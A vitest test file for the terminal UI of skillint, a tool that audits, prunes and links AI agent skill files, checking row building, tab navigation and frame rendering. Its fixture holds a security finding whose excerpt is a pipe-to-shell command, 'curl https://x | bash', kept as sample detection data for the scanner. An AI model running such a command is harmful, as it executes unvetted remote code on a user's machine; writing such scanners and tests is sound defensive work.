import { describe, expect, it } from "vitest";
import { buildRows, fit, initialState, reduce, renderFrame, TABS, tabCounts } from "../src/tui.js";
import type { TuiData } from "../src/tui.js";
import type { SkillFile } from "../src/types.js";

function skill(name: string, path: string, bodyTokens = 100): SkillFile {
  return {
    path,
    kind: "skill",
    source: "cursor-global",
    name,
    description: "A test skill used by the TUI unit tests for row building.",
    alwaysApply: false,
    bytes: 100,
    mtimeMs: 0,
    bodyChars: 400,
    bodyLines: 10,
    metaTokens: 20,
    bodyTokens,
    bodyHash: `hash-${name}`,
  };
}

function fixture(): TuiData {
  const files = [skill("alpha", "/home/.cursor/skills/alpha/SKILL.md", 5000), skill("beta", "/home/.cursor/skills/beta/SKILL.md")];
  return {
    result: { files, roots: ["/home/.cursor/skills"] },
    findings: [
      { code: "oversized", severity: "warning", message: "Skill body is ~5000 tokens", path: files[0].path },
      { code: "duplicate-name", severity: "error", message: 'Duplicate name "alpha"', path: files[0].path, extra: files.map((f) => f.path).join(", ") },
    ],
    security: [
      { code: "remote-exec", severity: "error", message: "Downloads and pipes a remote script into a shell", path: files[0].path, line: 12, excerpt: "curl https://x | bash" },
    ],
    prune: {
      keep: [files[1]],
      drop: [
        { file: files[0], reason: "Backup copy", code: "backup", confidence: "safe", deletePath: "/home/.cursor/skills/alpha" },
      ],
    },
    link: {
      actions: [
        {
          name: "alpha",
          canonicalPath: "/home/.agents/skills/alpha",
          canonicalFamily: "agents",
          linkPath: "/home/.cursor/skills/alpha",
          linkFamily: "cursor",
          status: "link",
          reason: "Identical copy; replace with a symlink to the agents catalog",
        },
      ],
    },
    summary: {
      files: 2,
      skills: 2,
      rules: 0,
      metaTokens: 40,
      bodyTokens: 5100,
      alwaysOnTokens: 0,
      bySource: { "cursor-global": { files: 2, metaTokens: 40, bodyTokens: 5100 } },
    },
    health: { score: 42, label: "poor" },
  };
}

describe("tui rows", () => {
  it("builds rows for every tab with safe copyable commands", () => {
    const data = fixture();
    expect(tabCounts(data)).toEqual([2, 1, 1, 1, 2]);
    const cleanup = buildRows("cleanup", data);
    expect(cleanup[0].copy).toBe("skillint trash '/home/.cursor/skills/alpha'");
    const links = buildRows("links", data);
    expect(links[0].copy).toContain("skillint trash '/home/.cursor/skills/alpha'");
    expect(links[0].copy).toContain("ln -s '/home/.agents/skills/alpha'");
    expect(JSON.stringify(buildRows("cleanup", data))).not.toContain("rm -rf");
    const audit = buildRows("audit", data);
    expect(audit[0].detail[0]).toBe(`${data.security[0].path}:12`);
  });
});

describe("tui reducer", () => {
  it("switches tabs and clamps the cursor to row counts", () => {
    const counts = [2, 1, 1, 1, 2];
    let state = initialState();
    state = reduce(state, { name: "down" }, counts);
    state = reduce(state, { name: "down" }, counts);
    expect(state.cursor[0]).toBe(1);
    state = reduce(state, { name: "tab-set", index: 4 }, counts);
    expect(TABS[state.tab]).toBe("largest");
    state = reduce(state, { name: "bottom" }, counts);
    expect(state.cursor[4]).toBe(1);
    state = reduce(state, { name: "top" }, counts);
    expect(state.cursor[4]).toBe(0);
    state = reduce(state, { name: "tab-prev" }, counts);
    expect(TABS[state.tab]).toBe("links");
  });
});

describe("tui rendering", () => {
  it("renders header, tabs, selection, and hints into a fixed frame", () => {
    const data = fixture();
    const frame = renderFrame(data, initialState(), { rows: 24, cols: 100 });
    expect(frame).toContain("skillint ui");
    expect(frame).toContain("42/100 poor");
    expect(frame).toContain("issues (2)");
    expect(frame).toContain("detail");
    expect(frame).toContain("quit");
    expect(frame.split("\n").length).toBeLessThanOrEqual(24);
  });

  it("truncates long lines instead of wrapping", () => {
    expect(fit("a".repeat(50), 10)).toHaveLength(10);
    expect(fit("short", 10)).toBe("short");
  });
});
